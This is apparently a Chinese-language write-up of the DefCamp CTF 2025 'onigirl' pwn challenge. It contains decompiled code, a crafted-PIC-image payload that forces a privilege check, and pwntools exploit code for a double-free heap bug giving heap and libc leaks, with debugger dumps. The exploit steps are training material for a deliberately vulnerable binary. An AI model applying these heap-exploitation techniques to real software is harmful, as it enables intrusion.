# DefCamp CTF 2025 onigirl 复盘详解

> 原文: https://www.ctfiot.com/273679.html
> ID: 273679

1

题目情况

Arch:
amd64-64-littleRELRO:
FullRELROStack:
CanaryfoundNX:
NXenabledPIE:
PIEenabled

2

逆向分析（前半）：privilege值生成

v47 = __readfsqword(0x28u);setbuf(stdin,0);setbuf(stderr,0);setbuf(stdout,0); random_seed =time(0); // 随机数srand(random_seed); privilege_value =4; modification_parameters = modification_parameters_1; privilege_pointer = &privilege_value;printf("Enter image size in bytes: ");if( !fgets(size_input_buffer,32, stdin) ) // 输入size {fwrite("Failed to read sizen",1u,0x14u, stderr);return1; } input_size =strtoul(size_input_buffer,0,10);// 转换成数字if( !input_size || input_size >0x10000) // 不能是0，不能>0x10000 {fprintf(stderr,"Bad size (1–%d)n",0x10000);return1; } allocated_buffer =malloc(input_size); // 分配内存if( !allocated_buffer ) {perror("malloc");return1; } bytes_read =read(0, allocated_buffer, input_size);if( bytes_read <=0) {perror("read");free(allocated_buffer);return1; } image_buffer = allocated_buffer; loaded_image_data = (char*)stbi_load_from_memory( (__int64)allocated_buffer, input_size, (unsignedint*)&image_width, (unsignedint*)&image_height, (__int64 *)&p_menu_choice_storage,3u, modification_parameters_1);if( loaded_image_data ) { center_x = (double)image_width /2.0; center_y = (double)image_height /2.0; max_distance =hypot(center_x, center_y); random_modification_index = (int)((double)rand() /2147483647.0*0.7*3.0+0.8);// 1 *(double*)&modification_parameters[random_modification_index /2+3] = (double)rand() /2147483647.0*0.2+0.1; *(double*)&modification_parameters[3* random_modification_index] = (double)rand() /2147483647.0*0.25+0.15;for( row_index =0; row_index < image_height; ++row_index ) { row_data_offset = &loaded_image_data[3* row_index * image_width];if( (row_index &1) !=0) row_color_value =220;else row_color_value =255; current_row_color = row_color_value;for( i =0; i < image_width; ++i ) { pixel_pointer = &row_data_offset[3* i]; distance_from_center =hypot((double)i - center_x, (double)row_index - center_y); normalized_distance = distance_from_center / max_distance; distance_factor =1.8* (1.0- distance_from_center / max_distance); random_value =rand(); *(double*)&modification_parameters[random_modification_index +4] =1.0 - *(double*)&modification_parameters[random_modification_index +1] * ((double)(unsigned__int8)random_value /127.0); *(double*)&modification_parameters[random_modification_index +1] = *(double*)&modification_parameters[random_modification_index +5] * ((double)BYTE1(random_value) /127.0) +1.0; *(double*)&modification_parameters[2* random_modification_index +1] =1.0 - *(double*)&modification_parameters[2* random_modification_index +3] * ((double)BYTE2(random_value) /127.0);if( (random_value &0x3FF) ==0) { *pixel_pointer ^=0x3Fu; pixel_pointer[1] ^=0x7Fu; pixel_pointer[2] = ~pixel_pointer[2]; } red_component =pow((double)(unsigned__int8)*pixel_pointer /255.0, (double)random_modification_index); processed_red = red_component * *(double*)&modification_parameters[random_modification_index +4]; green_component =pow((double)(unsigned__int8)pixel_pointer[1] /255.0, (double)random_modification_index); processed_green = *(double*)&modification_parameters[random_modification_index +5] * ((distance_factor +1.0) * green_component); blue_component =pow((double)(unsigned__int8)pixel_pointer[2] /255.0, (double)random_modification_index); processed_blue = blue_component * *(double*)&modification_parameters[random_modification_index +4]; clamped_red =fmin(processed_red,1.0); *pixel_pointer = (int)(clamped_red * (double)current_row_color); clamped_green =fmin(processed_green,1.0); pixel_pointer[1] = (int)(clamped_green * (double)current_row_color); clamped_blue =fmin(processed_blue,1.0); pixel_pointer[2] = (int)(clamped_blue * (double)current_row_color); *privilege_pointer ^= (unsigned__int8)(pixel_pointer[1] & *pixel_pointer) & (unsigned__int8)pixel_pointer[2] &0xF; } } *privilege_pointer |=7u; *privilege_pointer &=0x1FFFu; final_privilege_value = *privilege_pointer; *privilege_pointer =rand() &0x3F| final_privilege_value; temporary_buffer_1 =malloc(0x2F0u); temporary_buffer_2 =malloc(0x8F0u);stbi_image_free(loaded_image_data); privilege = *privilege_pointer !=4919; menu_format_string ="yo face = %dn";printf("yo face = %dn", *privilege_pointer);

基于像素点到图像中心的距离进行颜色调整。

引入随机扰动影响颜色计算。

应用幂函数和参数矩阵对 RGB 分量进行非线性变换。

某些像素进行 XOR 或 NOT 操作以引入噪声。

privilege= *privilege_pointer !=4919;

*privilege_pointer ^= (unsigned__int8)(pixel_pointer[1] & *pixel_pointer) & (unsigned__int8)pixel_pointer[2] &0xF;

*privilege_pointer|=7u;*privilege_pointer&=0x1FFFu;final_privilege_value=*privilege_pointer;*privilege_pointer=rand()&0x3F|final_privilege_value;privilege=*privilege_pointer!=4919;

privilege_value=4;modification_parameters= modification_parameters_1;privilege_pointer= &privilege_value;

__int64 modification_parameters_1[10]; //[rsp+D0h][rbp-A0h]BYREF int privilege_value; //[rsp+120h][rbp-50h]BYREF char size_input_buffer[40]; //[rsp+130h][rbp-40h]BYREF

modification_parameters = modification_parameters_1;... loaded_image_data = (char*)stbi_load_from_memory( (__int64)allocated_buffer, input_size, (unsignedint*)&image_width, (unsignedint*)&image_height, (__int64 *)&p_menu_choice_storage,3u, modification_parameters_1);..。

__int64 __fastcallstbi_load_from_memory( __int64 buf,intsize,unsignedint*p_j,unsignedint*p_i, __int64 *p_menu_choice_storage,unsignedintn3, __int64 *modification_parameters){ __int64 v12[30];// [rsp+30h] [rbp-F0h] BYREF v12[29] = __readfsqword(0x28u);stbi__start_mem(v12, buf, size);returnstbi__load_and_postprocess_8bit((int)v12, p_j, p_i, p_menu_choice_storage, n3, modification_parameters);}

char*__fastcallstbi__load_and_postprocess_8bit(unsignedint*a1,unsignedint*p_j,unsignedint*p_i, __int64 *p_menu_choice_storage,unsignedintn3, __int64 *modification_parameters){unsignedintn3_1;// eaxboolv8;// alintn3_2;// eaxchar*main;// [rsp+40h] [rbp-20h]unsignedintp_n8[3];// [rsp+4Ch] [rbp-14h] BYREFunsigned__int64 v15;// [rsp+58h] [rbp-8h] v15 = __readfsqword(0x28u); main =stbi__load_main(a1, p_j, p_i, p_menu_choice_storage, n3, p_n8,8, modification_parameters);if( !main )return0;if( p_n8[0] !=8&& p_n8[0] !=16) __assert_fail("ri.bits_per_channel == 8 || ri.bits_per_channel == 16","stb_image.h",0x50Cu,"stbi__load_and_postprocess_8bit");if( p_n8[0] !=8) {if( n3 )...

char*__fastcallstbi__load_main(unsignedint*p_n4096,unsignedint*p_j,unsignedint*p_i, __int64 *p_menu_choice_storage,unsignedintn3, _DWORD *p_n8,intn8, __int64 *modification_parameters){unsignedintn3_1;// eaxvoid*v14;// [rsp+38h] [rbp-8h]memset(p_n8,0,0xCu); *p_n8 =8; p_n8[2] =0; p_n8[1] =0;if( (unsignedint)stbi__png_test(p_n4096, modification_parameters) )return(char*)stbi__png_load(p_n4096, p_j, p_i, p_menu_choice_storage, n3, p_n8, modification_parameters);if( (unsignedint)stbi__bmp_test(p_n4096, modification_parameters) )returnstbi__bmp_load(p_n4096, p_j, p_i, p_menu_choice_storage, n3, p_n8, modification_parameters);if(stbi__gif_test(p_n4096, modification_parameters) )return(char*)stbi__gif_load(p_n4096, p_j, p_i, p_menu_choice_storage, n3, p_n8, modification_parameters);if( (unsignedint)stbi__psd_test(p_n4096, modification_parameters) )returnstbi__psd_load(p_n4096, p_j, p_i, p_menu_choice_storage, n3, p_n8, n8, modification_parameters);if( (unsignedint)stbi__pic_test(p_n4096, modification_parameters) )return(char*)stbi__pic_load( p_n4096, p_j, p_i, (unsignedint*)p_menu_choice_storage, n3, p_n8, modification_parameters);if( (unsignedint)stbi__jpeg_test(p_n4096, modification_parameters) )return(char*)stbi__jpeg_load(p_n4096, p_j, p_i, p_menu_choice_storage, n3, p_n8, modification_parameters);if( (unsignedint)stbi__pnm_test(p_n4096, modification_parameters) )returnstbi__pnm_load((int*)p_n4096, p_j, p_i, p_menu_choice_storage, n3, p_n8, modification_parameters);if( (unsignedint)stbi__hdr_test(p_n4096, modification_parameters) ) { v14 =stbi__hdr_load(p_n4096, p_j, p_i, p_menu_choice_storage, n3, p_n8, modification_parameters);if( n3 ) n3_1 = n3;else n3_1 = *(_DWORD *)p_menu_choice_storage;return(char*)stbi__hdr_to_ldr(v14, *p_j, *p_i, n3_1); }elseif( (unsignedint)stbi__tga_test(p_n4096, modification_parameters) ) {return(char*)stbi__tga_load(p_n4096, p_j, p_i, p_menu_choice_storage, n3, p_n8); }else {stbi__err("unknown image type");return0; }}

if( !stbi__pic_load_core( file_data_ptr, image_width, image_height, local_format_ptr, (char*)loaded_image_data, image_modifications_ptr) ) {free(loaded_image_data); loaded_image_data =0; } *image_width_ptr = image_width; *image_height_ptr = image_height;if( !requested_components ) requested_components = *local_format_ptr; loaded_image_data = (void*)stbi__convert_format( loaded_image_data,4, requested_components, image_width, image_height);for( i =0; i <=10; ++i ) *(double*)&image_modifications_ptr[i] = image_noises[i];returnloaded_image_data;

if( mod_result >0) index_temp = ((unsigned__int8)*buffer_ptr - (unsigned__int8)*(buffer_ptr -4)) %11;// 不求反的情况 image_noises[index_temp] = noise_value + (double)(unsigned__int8)(buffer_ptr[1] ^ buffer_ptr[2]) *1.0e-16; buffer_ptr +=4; // 累加操作 }

3

利用分析&利用过程（前半）

if( (unsignedint)stbi__pic_test(p_n4096, modification_parameters) )return(char*)stbi__pic_load( p_n4096, p_j, p_i, (unsignedint*)p_menu_choice_storage, n3, p_n8, modification_parameters);

__int64 __fastcallstbi__pic_test(unsignedint*p_n4096, __int64 *modification_parameters){unsignedintv3;// [rsp+1Ch] [rbp-4h] v3 =stbi__pic_test_core(p_n4096, modification_parameters);stbi__rewind(p_n4096);returnv3;}_BOOL8 __fastcallstbi__pic_test_core(unsignedint*p_n4096, __int64 *modification_parameters){inti;// [rsp+1Ch] [rbp-4h]if( !(unsignedint)stbi__pic_is4(p_n4096, &PICT) )// 4个字节头校验：53 80 f6 34return0;for( i =0; i <=0x53; ++i )stbi__get8(p_n4096);return(unsignedint)stbi__pic_is4(p_n4096,"PICT") !=0;}

local_format_ptr = image_format_ptr; stack_canary_value = __readfsqword(0x28u);if( !image_format_ptr ) local_format_ptr = (unsignedint*)&temp_format_storage;for( header_skip_counter =0; header_skip_counter <=0x5B; ++header_skip_counter )stbi__get8((__int64 *)file_data_ptr); // 跳过header 92字节 image_width =stbi__get16be(file_data_ptr); // 16bit大端序 image_height =stbi__get16be(file_data_ptr); // 16bit大端序if( (int)image_height >4096|| (int)image_width >4096)// 不能超过4096gotoLABEL_12;if( (unsignedint)stbi__at_eof(file_data_ptr) ) {stbi__err("bad file");return0; }if( (unsignedint)stbi__mad3sizes_valid(image_width, image_height,4,0) ) {stbi__get32be(file_data_ptr); // 跳过8字节stbi__get16be(file_data_ptr);stbi__get16be(file_data_ptr); loaded_image_data = (void*)stbi__malloc_mad3(image_width, image_height,4u,0);// 分配内存if( loaded_image_data ) {memset(loaded_image_data,0xFF, (int)(4* image_height * image_width));if( !stbi__pic_load_core( file_data_ptr, image_width, image_height, local_format_ptr, (char*)loaded_image_data, image_modifications_ptr) )

*(_QWORD *)&buffer_ptr_1[4] = __readfsqword(0x28u); compression_flags =0; header_index =0;do {if( header_index ==10) {LABEL_3:
stbi__err("bad format");return0; } temp_int = header_index++; header_ptr = &header_data[3* temp_int]; // 3字节 header_type = (unsigned__int8)stbi__get8((__int64)data_stream);// 类型，为0的时候跳出结构 *header_ptr =stbi__get8((__int64)data_stream);// 需要是8，必须是8 header_ptr[1] =stbi__get8((__int64)data_stream); header_ptr[2] =stbi__get8((__int64)data_stream); compression_flags |= header_ptr[2];if( (unsignedint)stbi__at_eof(data_stream) ) {LABEL_54:
stbi__err("bad file");return0; }if( *header_ptr !=8)gotoLABEL_3; }while( header_type );if( (compression_flags &0x10) !=0) channel_count =4;else channel_count =3; *channels_out = channel_count; // 这个数据是返回的，后面处理不用，不用管

for( i =0; i < row_index; ++i ) {for( channel_index =0; channel_index < header_index; ++channel_index )// 1个通道头，就只执行一轮 { channel_header_ptr = &header_data[3* channel_index]; buffer_ptr = &output_buffer[4* width * i];if( channel_header_ptr[1] ==2) // 通道头 = 2 {... }else // 1或者0的情况 {if( (unsigned__int8)header_data[3* channel_index +1] >2u)// 只能是0 1 2gotoLABEL_3;if( header_data[3* channel_index +1] )// 1 的情况 {... }else // 0的情况 {for( copy_count =0; copy_count < width; ++copy_count )// 累加次数是width {if( !stbi__readval(data_stream, (unsigned__int8)channel_header_ptr[2], buffer_ptr) )// 需要读取的值不为0，读取4字节到buffer_ptrreturn0; mod_result = ((unsigned__int8)*buffer_ptr - (unsigned__int8)*(buffer_ptr -4)) %11;// 每次读取4字节，首字节相减求模11 neg_mod_result = -mod_result; // 求反if( mod_result >0) // 如果是大于0的值 neg_mod_result = ((unsigned__int8)*buffer_ptr - (unsigned__int8)*(buffer_ptr -4)) %11;// 就不进行求反，值是0-10的值，1010 noise_value = image_noises[neg_mod_result];// 原本的噪音// pwndbg> p $st0// $1 = 2 index_temp = -mod_result; // 索引是求反的值// 如果是-10，求反变成10，就能控制idx=10，溢出位所在if( mod_result >0) index_temp = ((unsigned__int8)*buffer_ptr - (unsigned__int8)*(buffer_ptr -4)) %11;// 不求反的情况 image_noises[index_temp] = noise_value + (double)(unsigned__int8)(buffer_ptr[1] ^ buffer_ptr[2]) *1.0e-16; buffer_ptr +=4; // 累加操作 } } } } }returnoutput_buffer;

bytes([10,0xf0,0x0f,4]) +bytes([0,0xf0,0x0f,4])

defpack_data():
returnbytes([10,0xf0,0x0f,4]) + bytes([0,0xf0,0x0f,4])data = flat({# header check0:
bytes([0x53,0x80,0xF6,0x34]),0x58:b"PICT",0x5c:
p16(0x5500), # width big endian0x5e:
p16(0x100), # height big endian0x68:
bytes([0,8,0,0xf0]),# header info0x6c:
pack_data()*0x40},filler=b"x00")sz = len(data)ru(b"Enter image size in bytes: ")sl(str(sz).encode())sl(data)ru(b"yo face = ")num = rl()[:-1]success(f"num = {num} / 4919")

[DEBUG] Received0x1bbytes: b'Enter image size in bytes: '[DEBUG] Sent0x4bytes: b'620n'[DEBUG] Sent0x26dbytes:
000000005380f634000000000000000000000000 │S··4│····│····│····│0000001000000000000000000000000000000000 │····│····│····│····│ *0000005000000000000000005049435400550001 │····│····│PICT│·U··│000000600000000000000000000800f0 0a f00f04 │····│····│····│····│0000007000f00f040a f00f0400f00f040a f00f04 │····│····│····│····│ *0000026000f00f040a f00f0400f00f040a │····│····│····│·│0000026d[DEBUG] Received0x26bytes: b'yo face = 4919n' b'=== restoaurnat ===n' b'>> '[+] num = b'4919'/4919

4

逆向分析（后半）：菜单堆管理

while(1) {while(1) {menu(menu_format_string); menu_format_string ="%d";if( (unsignedint)__isoc99_scanf("%d", &choice) !=1) {puts("Invalid input!");exit(1); }if( choice !=31)break;if( privilege )gotoLABEL_39;do_show(); // 检查chunk指针，打印8字节 }if( choice >31)gotoLABEL_42;if( choice ==17) {puts("Here's a dollar go get yoself a mggaga");gotoLABEL_42; }if( choice >17)gotoLABEL_42;if( choice ==1) {if( privilege )gotoLABEL_39;do_alloc(); // 申请，填充数据，只能申请2次 }elseif( choice ==2) {if( privilege ) {LABEL_39: menu_format_string ="You have to be a pwn monk to order";puts("You have to be a pwn monk to order"); }else {do_delete("%d"); // 存在未清空的指针 } }else {LABEL_42: menu_format_string ="Invalid choice!";puts("Invalid choice!"); } } } error_message = (constchar*)stbi_failure_reason(image_buffer);printf("Error loading image: %sn", error_message);return1;

unsigned__int64 __fastcalldo_alloc(){unsignedintidx;// [rsp+Ch] [rbp-84h] BYREFsize_tsize;// [rsp+10h] [rbp-80h]void*s;// [rsp+18h] [rbp-78h] _BYTE buf[104];// [rsp+20h] [rbp-70h] BYREFunsigned__int64 v5;// [rsp+88h] [rbp-8h] v5 = __readfsqword(0x28u);printf("order: ");if( (unsignedint)__isoc99_scanf("%d", &idx) ==1&& idx <=0xA) {printf("describe ");getchar(); size =read(0, buf,0x5Fu); // 长度取决于输入长度if( (__int64)size >0) // 读取的长度 {if( buf[size -1] ==10) // 最后一个是n，就忽略 --size;if( size && (__int64)size <=0x5F) // 长度<=0x5f {if( size != sizes[allowed] ) // 数组，size不同就设置到数组里 sizes[++allowed] = size; // 从1开始if( allowed <=2) // 前2个 { s =malloc(size); // 申请内存if( !s )exit(1);memset(s,0,8u);memcpy(s, buf, size); // 复制 chunks[idx] = (__int64)s; // 设置指针puts("big chungus."); }else {puts("You ate too much and pooped yoself"); } } } }returnv5 - __readfsqword(0x28u);}

unsigned__int64 __fastcalldo_delete(){unsignedintidx;// [rsp+4h] [rbp-Ch] BYREFunsigned__int64 v2;// [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u);printf("throw? D: ");if( (unsignedint)__isoc99_scanf("%d", &idx) ==1&& idx <=0xA)free((void*)chunks[idx]); // UAF，Double-Freereturnv2 - __readfsqword(0x28u);}

unsigned__int64 __fastcalldo_show(){unsignedintidx;// [rsp+4h] [rbp-Ch] BYREFunsigned__int64 v2;// [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u);printf("food where: ");if( (unsignedint)__isoc99_scanf("%d", &idx) ==1&& idx <=0xA)// 输入 1~10 {printf("burgir[%d]: ", idx);if( chunks[idx] ) // 指针存在，就打印8字节write(1, (constvoid*)chunks[idx],8u); }returnv2 - __readfsqword(0x28u);}

defcmd(i, prompt=b">> "):
sla(prompt, i)defadd(idx, data):
cmd('1')sla(b"order: ",str(idx).encode())sla(b"describe ", data) #......defdele(idx):
cmd('2')sla(b"throw? D: ",str(idx).encode()) #......defshow(idx):
cmd('31')sla(b"food where: ",str(idx).encode()) #......

5

利用分析&利用过程（后半）

add(0,b"A"*0x58)dele(0)show(0)ru(b"burgir[0]: ")heap_leak = r(8)heap_leak = u64(heap_leak)success(f"heap_leak = {hex(heap_leak)}")heap_base = (heap_leak << 12 )- 0x1000

if((unsignedlong) (nb) <= (unsignedlong) (get_max_fast()))/* fastbin 尺寸 */ { idx =fastbin_index(nb);/* 计算对应 fastbin 索引 */ mfastbinptr *fb = &fastbin(av, idx);/* 获取该 fastbin 的链表头指针 */ mchunkptr pp; victim = *fb;/* 候选块：链表当前头 */if(victim !=NULL)/* fastbin 非空：尝试取出 */ {if(__glibc_unlikely (misaligned_chunk(victim)))malloc_printerr("malloc(): unaligned fastbin chunk detected 2");/* 保护性检查：头地址未按对齐 */if(SINGLE_THREAD_P) *fb =REVEAL_PTR(victim->fd);/* 单线程：解密指针得到fd地址 */elseREMOVE_FB(fb, pp, victim);/* 多线程情况 */if(__glibc_likely (victim !=NULL)) {size_tvictim_idx =fastbin_index(chunksize(victim));if(__builtin_expect (victim_idx != idx,0))malloc_printerr("malloc(): memory corruption (fast)");/* 块大小与bin不匹配：内存损坏 */check_remalloced_chunk(av, victim, nb);#ifUSE_TCACHE/* While we're here, if we see other chunks of the same size, stash them in the tcache. */size_ttc_idx =csize2tidx(nb);	/* 获取tcache索引 */if(tcache !=NULL&& tc_idx < mp_.tcache_bins)	/* tcachebin 没填满就往下走 */ { mchunkptr tc_victim;/* While bin not empty and tcache not full, copy chunks. */while(tcache->counts[tc_idx] < mp_.tcache_count	/* 直到填满为止 */ && (tc_victim = *fb) !=NULL) {if(__glibc_unlikely (misaligned_chunk(tc_victim)))	/* 保护性检查：头地址对齐 */malloc_printerr("malloc(): unaligned fastbin chunk detected 3");if(SINGLE_THREAD_P) *fb =REVEAL_PTR(tc_victim->fd);/*解密tcachebin chunk fd指针*/else {REMOVE_FB(fb, pp, tc_victim);if(__glibc_unlikely (tc_victim ==NULL))break; }tcache_put(tc_victim, tc_idx);	/*放入 tcachebin */ } }#endifvoid*p =chunk2mem(victim);/* 从chunk头换算用户指针 */alloc_perturb(p, bytes);/* 可选扰动填充，帮助发现越界 */returnp;/* fastbin 命中直接返回 */ } } }

unsignedintidx =fastbin_index(size); fb = &fastbin(av, idx); // 取出 fastbin 第一个 chunk/* Atomically link P to its fastbin: P->FD = *FB; *FB = P; */ mchunkptr old = *fb, old2;if(SINGLE_THREAD_P) {/* Check that the top of the bin is not the record we are going to add (i.e., double free). */if(__builtin_expect (old == p,0))// 检查和fastbin第一个chunk是否相同，相同则认为发生了 double freemalloc_printerr("double free or corruption (fasttop)"); p->fd =PROTECT_PTR(&p->fd, old); // 加密指针，存入 *fb = p; }

0x5643909ab380 0x0000000000000000 0x0000000000000061 ........a.......0x5643909ab390 0x00000005643909ab 0x00000005643909ab ..9d......9d....0x5643909ab3a0 0x00000005643909ab 0x00000005643909ab ..9d......9d....0x5643909ab3b0 0x00000005643909ab 0x00000005643909ab ..9d......9d....0x5643909ab3c0 0x00000005643909ab 0x00000005643909ab ..9d......9d....0x5643909ab3d0 0x00000005643909ab 0x00000005643909ab ..9d......9d....0x5643909ab3e0 0x00000005643909ab 0x0000000000000061 ..9d....a..........0x5643909ab620 0x4242424242424242 0x0000000000000061 BBBBBBBBa....... <-- fastbins[0x60][0], fastbins[0x60][0]0x5643909ab630 0x00005646f4a3bf2b 0x4141414141414141 +...FV..AAAAAAAA0x5643909ab640 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x5643909ab650 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x5643909ab660 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x5643909ab670 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x5643909ab680 0x4141414141414141 0x0000000000000061 AAAAAAAAa....... <-- fastbins[0x60][1]0x5643909ab690 0x00005646f4a3bf8b 0x4141414141414141 ....FV..AAAAAAAA0x5643909ab6a0 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x5643909ab6b0 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x5643909ab6c0 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x5643909ab6d0 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x5643909ab6e0 0x4141414141414141 0x0000000000000061 AAAAAAAAa.......0x5643909ab6f0 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x5643909ab700 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x5643909ab710 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x5643909ab720 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x5643909ab730 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x5643909ab740 0x4141414141414141 0x0000000000000061 AAAAAAAAa.......0x5643909ab750 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x5643909ab760 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x5643909ab770 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x5643909ab780 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x5643909ab790 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x5643909ab7a0 0x4141414141414141 0x000000000001f861 AAAAAAAAa....... <--Topchunk

0x5643909ab380 0x0000000000000000 0x0000000000000061 ........a.......0x5643909ab390 0x00000005643909ab 0x00000005643909ab ..9d......9d....0x5643909ab3a0 0x00000005643909ab 0x00000005643909ab ..9d......9d.... <-- tcachebins[0x60][2/3]0x5643909ab3b0 0x00000005643909ab 0x00000005643909ab ..9d......9d....0x5643909ab3c0 0x00000005643909ab 0x00000005643909ab ..9d......9d....0x5643909ab3d0 0x00000005643909ab 0x00000005643909ab ..9d......9d....0x5643909ab3e0 0x00000005643909ab 0x0000000000000061 ..9d....a..........0x5643909ab630 0x00005646f4a3ba0b 0x4343434343434343 ....FV..CCCCCCCC <-- tcachebins[0x60][1/3]0x5643909ab640 0x4343434343434343 0x4343434343434343 CCCCCCCCCCCCCCCC0x5643909ab650 0x4343434343434343 0x4343434343434343 CCCCCCCCCCCCCCCC0x5643909ab660 0x4343434343434343 0x4343434343434343 CCCCCCCCCCCCCCCC0x5643909ab670 0x4343434343434343 0x4343434343434343 CCCCCCCCCCCCCCCC0x5643909ab680 0x4343434343434343 0x0000000000000061 CCCCCCCCa.......0x5643909ab690 0x00005646f4a3bf9b 0x3440601815321279 ....FV..y.2..`@4 <-- tcachebins[0x60][0/3]0x5643909ab6a0 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x5643909ab6b0 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x5643909ab6c0 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x5643909ab6d0 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x5643909ab6e0 0x4141414141414141 0x0000000000000061 AAAAAAAAa.......0x5643909ab6f0 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x5643909ab700 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x5643909ab710 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x5643909ab720 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x5643909ab730 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x5643909ab740 0x4141414141414141 0x0000000000000061 AAAAAAAAa.......0x5643909ab750 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x5643909ab760 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x5643909ab770 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x5643909ab780 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x5643909ab790 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x5643909ab7a0 0x4141414141414141 0x000000000001f861 AAAAAAAAa....... <-- Top chunk

pwndbg>binstcachebins0x60[ 3]:
0x5643909ab690—▸0x5643909ab630—▸0x5643909ab3a0◂—00x110[ 1]:
0x5643909aa680◂—00x160[ 1]:
0x5643909aa520◂—0fastbinsemptyunsortedbinempty

foriinrange(11):
add(i,b"A"*0x58)for i inrange(7):
dele(i)dele(7)dele(8)dele(7)for i inrange(6,-1,-1):
add(i,b"B"*0x58)dele(0)add(0,(pack((heap_base+0x1000)>>12))*11)add(7,pack((heap_base+0x13a0)^((heap_base+0x16a0)>>12))+b"C"*0x50)

0x55dc3ef75380 0x0000000000000000 0x0000000000000061 ........a.......0x55dc3ef75390 0x0000000000000000 0x0000000000000061 ........a.......0x55dc3ef753a0 0x0000000000000000 0x0000000000000000 ................0x55dc3ef753b0 0x0000000000000000 0x0000000000000000 ................0x55dc3ef753c0 0x0000000000000000 0x0000000000000000 ................0x55dc3ef753d0 0x0000000000000000 0x0000000000000000 ................0x55dc3ef753e0 0x0000000000000000 0x0000000000000061 ........a.......0x55dc3ef753f0 0x0000000000000000 0x00000000000003c1 ................ <-- unsortedbin[all][0]0x55dc3ef75400 0x00007f2b89310d00 0x00007f2b89310d00 ..1.+.....1.+...0x55dc3ef75410 0x4242424242424242 0x4242424242424242 BBBBBBBBBBBBBBBB0x55dc3ef75420 0x4242424242424242 0x4242424242424242 BBBBBBBBBBBBBBBB0x55dc3ef75430 0x4242424242424242 0x4242424242424242 BBBBBBBBBBBBBBBB0x55dc3ef75440 0x4242424242424242 0x0000000000000061 BBBBBBBBa..........0x55dc3ef75740 0x4141414141414141 0x0000000000000061 AAAAAAAAa.......0x55dc3ef75750 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x55dc3ef75760 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x55dc3ef75770 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x55dc3ef75780 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x55dc3ef75790 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x55dc3ef757a0 0x4141414141414141 0x0000000000000061 AAAAAAAAa.......0x55dc3ef757b0 0x00000000000003c0 0x0000000000000050 ........P.......0x55dc3ef757c0 0x0000000000000000 0x0000000000000041 ........A.......0x55dc3ef757d0 0x0000000000000000 0x0000000000000031 ........1.......0x55dc3ef757e0 0x0000000000000000 0x0000000000000021 ........!.......0x55dc3ef757f0 0x0000000000000000 0x0000000000000011 ................0x55dc3ef75800 0x0000000000000000 0x000000000001f801 ................ <--Topchunk

foriinrange(11):
add(i,b"A"*0x58)foriinrange(7): dele(i)dele(7)dele(8)dele(7)foriinrange(6,-1,-1):
add(i,b"B"*0x58)dele(0)add(0,(pack((heap_base+0x1000)>>12))*11)add(7,pack((heap_base+0x13a0)^((heap_base+0x16a0)>>12))+b"C"*0x50)
# """# overwrite tcachebin size to unsortedbin size
# """add(8,b"D"*0x58)add(7,b"E"*0x58)add(10,b"a"*0x58)dele(9)add(9,b"G"*0x40+pack(0)+pack(0x21)+b"A"*8)dele(0)add(0,pack(0)+pack(0x421)+b"q"*0x48)add(9,pack(0)+pack(0x51)+pack(0)+pack(0x41)+pack(0)+pack(0x31)+pack(0)+pack(0x21)+pack(0)+pack(0x11)+pack(0))dele(10)show(10)ru(b"burgir[10]: ")libc_leak=r(8)libc_leak=u64(libc_leak)success(f"libc_leak = {hex(libc_leak)}")libc.address=libc_leak-0x1d3d00success(f"libc.address = {hex(libc.address)}") add(10,pack(0)*9+pack(0x61)+pack(0))

pwndbg>binstcachebins0x110[ 1]:
0x55dc3ef74680◂—00x160[ 1]:
0x55dc3ef74520◂—0fastbinsemptyunsortedbinall:
0x55dc3ef753f0—▸0x7f2b89310d00(main_arena+96) ◂—0x55dc3ef753f0smallbinsemptylargebinsempty

while(true) {structexit_function_list*cur = *listp;if(cur ==NULL) { __exit_funcs_done =true;break; }while(cur->idx >0) {structexit_function*f = &cur->fns[--cur->idx];switch(f->flavor) {caseef_on: // on_exit函数caseef_at: // atexit函数 caseef_cxa: // C++析构函数// 执行函数... } }// 释放当前块，移动到下一个块 *listp = cur->next;if(*listp !=NULL)free(cur);}

structexit_function_list*__exit_funcs = &initial;

